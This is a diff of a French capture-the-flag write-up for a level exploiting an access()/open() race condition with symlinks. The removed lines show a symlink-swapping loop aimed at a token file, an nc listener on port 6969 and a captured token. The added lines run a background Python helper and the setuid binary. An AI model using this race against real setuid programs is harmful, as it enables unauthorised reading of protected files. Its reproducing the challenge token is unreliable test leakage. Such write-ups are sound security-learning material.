@@ -50,16 +50,12 @@ Mais l'utilisation d'access puis open crée un trou de sécurité comme l'expliq
 
 Ainsi, il est possible de donner en paramètre à lexécutable un fichier sur lequel nous avons tous les droits, afin que la fonction access retourne une réponse positive.
 
-Ensuite, en passant l'adresse IP de la machine 192.168.1.124, l'executable level10 attend une réponse ce qui nous laisse le temps de créer un lien symbolique sur le fichier passé en paramètre vers le fichier token:
+Ensuite, en passant l'adresse IP de la machine 192.168.1.124, l'executable level10 attend une réponse ce qui nous laisse le temps de créer un lien symbolique sur le fichier passé en paramètre vers le fichier token.
+pour faire ce scenario on créer un script python pour lance le serveur est cree le lien sumbolique quand on recoit un connection.
 
-    $ while true; do ln -fs ~/level10 /tmp/exploit; ln -fs ~/token /tmp/exploit; done
+    $ python /tmp/nc.py&
 
-    $ while true; do ./level10 /tmp/exploit 192.168.1.124; done
-
-    $ nc -lv 6969
-    [...]
-    .*( )*.
-    woupa2yuojeeaaed06riuj63c
+    $ rm -f /tmp/ex; touch /tmp/ex; ./level10 /tmp/ex <machine-ip>
 
     $ su flag10
     Password:
